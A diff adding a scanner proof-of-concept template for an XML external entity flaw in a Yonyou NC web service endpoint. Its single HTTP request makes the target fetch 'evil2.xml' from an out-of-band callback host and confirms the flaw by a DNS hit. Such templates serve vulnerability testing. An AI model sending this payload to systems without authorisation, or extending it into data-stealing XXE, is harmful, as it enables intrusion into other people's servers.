@@ -1,0 +1,16 @@
+id: poc-yaml-yongyou-iobamasternodewebservice-xxe
+info:
+  name: 用友NC IOBAMasterNodeWebService接口存在xml外部实体注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.itf.tb.oba.IOBAMasterNodeWebService?xsd=http://{{interactsh-url}}/evil2.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
